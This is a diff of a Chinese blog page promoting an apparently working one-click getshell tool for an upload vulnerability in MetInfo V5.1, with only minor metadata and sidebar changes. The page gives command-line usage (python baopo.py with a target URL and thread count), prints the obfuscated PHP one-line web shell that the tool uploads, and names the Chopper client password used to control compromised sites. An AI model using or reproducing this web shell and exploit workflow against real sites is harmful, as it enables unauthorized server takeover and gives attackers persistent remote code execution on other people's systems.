@@ -116,7 +116,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 <meta property="og:description" content="漏洞解析：
 config/config.inc.php12345678910111213141516171819202122232425262728293031$langoks = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_lang WHERE lang=&apos;$lang&apos;&quot;);if(!$langoks)die(&apos;No data in the database,plea">
 <meta property="og:image" content="http://7xusrl.com1.z0.glb.clouddn.com/MetInfo5.1GetshellGui.png">
-<meta property="og:updated_time" content="2016-10-29T07:07:05.903Z">
+<meta property="og:updated_time" content="2017-03-26T12:35:01.397Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="MetInfo V5.1 GetShell一键化工具">
 <meta name="twitter:description" content="漏洞解析：
@@ -459,13 +459,13 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
 <h1 id="文件说明"><a href="#文件说明" class="headerlink" title="文件说明"></a>文件说明</h1><hr>
 <blockquote>
 <p>MetInfo V5.1上传漏洞getshell利用工具</p>
-<p>   作者 : Akkuman</p>
-<p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
+<pre><code>作者 : Akkuman
+</code></pre><p>漏洞原理详见<a href="http://www.wooyun.org/bugs/wooyun-2010-0139168" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-0139168</a></p>
 <p>使用说明：<br>本目录有两个文件，一个py，一个exe<br>因为exe是py文件打包而成，故文件较大<br>64位系统测试使用通过</p>
 <p>如果你安装了py2.x环境  py文件使用方法<br>打开cmd<br>python baopo.py <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
 <p>exe命令行文件使用方法<br>打开cmd<br>baopo.exe <a href="http://www.xxx.com" target="_blank" rel="external">http://www.xxx.com</a> 20 0<br>20是线程数，0是每次请求等待时间（网站限制时可设置为2或3）可以自己指定</p>
 <p>GUI程序，应该不用说</p>
-<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt;<span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
+<p>关于getshell与结果<br>上传的是回调一句话木马<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; <span class="meta">&lt;?php</span> &gt;$e=$_REQUEST[<span class="string">'e'</span>];register_shutdown_function(base64_decode($e),$_&gt;REQUEST[<span class="string">'Akkuman'</span>]);<span class="meta">?&gt;</span></div><div class="line">&gt;</div></pre></td></tr></table></figure></p>
 <p>菜刀连接，密码是Akkuman</p>
 <p>爆破结果会生成在<strong>url.txt</strong></p>
 </blockquote>
@@ -651,7 +651,7 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -781,6 +781,10 @@ config/config.inc.php12345678910111213141516171819202122232425262728293031$lango
               
                 <li class="links-of-blogroll-item">
                   <a href="http://www.wooyun.co/" title="Aikur" target="_blank">Aikur</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://rcoil.me/" title="RcoIl" target="_blank">RcoIl</a>
                 </li>
               
             </ul>
